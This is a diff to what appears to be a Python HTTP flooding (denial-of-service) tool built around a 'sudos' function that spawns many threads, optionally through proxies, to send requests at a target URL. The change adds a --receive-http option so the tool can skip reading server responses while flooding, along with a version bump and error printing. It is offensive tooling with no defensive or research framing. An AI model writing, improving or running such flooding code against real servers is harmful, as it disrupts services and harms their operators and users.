@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-#version: 2.5 beta
+#version: 2.5.1 beta
 import threading
 import argparse
 import random
@@ -61,6 +61,7 @@ def sudos(url, **kwargs):
         proxy_type = kwargs.get("proxy_type")
         proxy_host = kwargs.get("proxy_host")
         proxy_port = kwargs.get("proxy_port")
+        receive_http = kwargs.get("receive_http")
         url_dict = url_split(url)
         if not url_dict:
             print(f"sudos error: invalid url")
@@ -109,13 +110,14 @@ def sudos(url, **kwargs):
             total_ups += up
             hrs += 1
             total_hrs += 1
-            while True:
-                receive = sock.recv(1024)
-                download = len(receive)
-                dps += download
-                total_dps += download
-                if download < 1024:
-                    break
+            if receive_http:
+                while True:
+                    receive = sock.recv(1024)
+                    download = len(receive)
+                    dps += download
+                    total_dps += download
+                    if download < 1024:
+                        break
             time.sleep(delay)
     except Exception as e:
         #print(f"sudos error: {e}")
@@ -227,6 +229,7 @@ def main():
         parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
         parser.add_argument("-v", "--delay", type=int, default=1, metavar="DELAY", help="Timeout per HTTP request")
         parser.add_argument("-b", "--connection-limit", type=int, metavar="INT", help="Connected socket count before flooding the target server")
+        parser.add_argument("-n", "--receive-http", action="store_true", help="Whether to receive HTTP response or not")
         parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
         args = parser.parse_args()
 
@@ -234,6 +237,8 @@ def main():
         proxy_type = args.proxy_type
         proxy_list = args.proxy_list
         timeout = args.timeout
+        receive_http = args.receive_http
+        
         url = args.url
         if not url:
             print(f"ERROR: URL is required")
@@ -285,7 +290,7 @@ def main():
                     while True:
                         if active_threads >= max_threads:
                             continue
-                        threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port}, daemon=True).start()
+                        threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port, "receive_http": receive_http}, daemon=True).start()
                         break
         else:
             while True:
@@ -294,7 +299,8 @@ def main():
                 threading.Thread(target=sudos, args=[url], daemon=True).start()
     except KeyboardInterrupt:
         sys.exit()
-    except Exception:
+    except Exception as e:
+        print(f"main error: {e}")
         pass
 
 if __name__ == "__main__":
